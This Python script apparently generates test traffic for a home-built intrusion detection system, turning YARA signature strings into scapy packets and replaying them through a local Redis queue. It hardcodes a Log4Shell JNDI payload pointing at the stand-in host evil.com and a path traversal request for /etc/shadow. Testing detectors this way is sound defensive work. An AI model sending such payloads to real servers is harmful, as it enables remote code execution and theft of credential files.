import time
import json
import redis
import random
import re
import codecs
from scapy.all import IP, TCP, Raw, wrpcap

def extract_yara_payloads(yara_file="matrix.yar", limit=50):
    """Mines the compiled YARA matrix for exact exploit signatures."""
    print(f"[*] Mining {yara_file} for live exploit signatures...")
    payloads = []
    
    try:
        with open(yara_file, 'r') as f:
            content = f.read()
            
        # Extract the exact string/hex contents from the $s1 variables
        matches = re.findall(r'\$s1\s*=\s*"(.*?)"', content)
        
        # Shuffle to get a diverse matrix of CVEs rather than just the top 50
        random.shuffle(matches)
        
        for match in matches:
            if len(payloads) >= limit:
                break
            try:
                # Convert YARA escaped hex (\\x41) back into raw packet bytes (\x41)
                raw_bytes = codecs.decode(match, 'unicode_escape').encode('latin1')
                # Skip incredibly tiny signatures to avoid accidental false positives
                if len(raw_bytes) > 4: 
                    payloads.append(raw_bytes)
            except Exception:
                continue
                
        print(f"[+] Successfully extracted {len(payloads)} weaponized payloads from OSINT feed.")
        return payloads
    except FileNotFoundError:
        print(f"[-] {yara_file} not found. Run feed_updater.py first.")
        return []

def generate_targeted_suite(filename="targeted_threats.pcap"):
    """Crafts a PCAP utilizing the mined YARA payloads."""
    payloads = extract_yara_payloads(limit=50)
    if not payloads:
        return
        
    print(f"[*] Compiling targeted threat matrix into {filename}...")
    packets = []
    
    for i, payload in enumerate(payloads):
        # Vary the source IPs to simulate a distributed scan
        src_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
        pkt = IP(src=src_ip, dst="192.168.1.1") / TCP(sport=random.randint(1024, 65535), dport=80) / Raw(load=payload)
        packets.append(pkt)

    # Throw in our manual tests to verify the core rules
    packets.append(IP(src="10.0.0.99", dst="192.168.1.1") / TCP(sport=1337, dport=80) / Raw(load=b"EXPLOIT_PAYLOAD_V1"))
    packets.append(IP(src="10.0.0.99", dst="192.168.1.1") / TCP(sport=1337, dport=80) / Raw(load=b"${jndi:ldap://evil.com/a}"))
    packets.append(IP(src="10.0.0.99", dst="192.168.1.1") / TCP(sport=1337, dport=80) / Raw(load=b"GET /../../../etc/shadow HTTP/1.1"))

    wrpcap(filename, packets)
    print(f"[+] Successfully baked {len(packets)} structural packets into test suite.")

def replay_pcap_to_redis(filename="targeted_threats.pcap", pps=50):
    """Streams the PCAP down the master's Redis engine."""
    r = redis.Redis(host='localhost', port=6379, db=0)
    print(f"[*] Connecting to local packet_buffer queue. Injecting at {pps} PPS...")
    
    from scapy.utils import PcapReader
    
    total_injected = 0
    delay = 1.0 / pps
    
    with PcapReader(filename) as pcap_reader:
        for pkt in pcap_reader:
            raw_bytes = bytes(pkt)
            hex_payload = raw_bytes.hex()
            
            r.lpush("packet_buffer", hex_payload)
            total_injected += 1
            time.sleep(delay)
            
    print(f"[+] Precision replay sequence complete. Total injected: {total_injected}")

if __name__ == "__main__":
    generate_targeted_suite()
    
    print("\n[!] Ensure sentinel_master.py is running.")
    input("[?] Press Enter to fire the targeted precision matrix...")
    
    replay_pcap_to_redis(pps=20)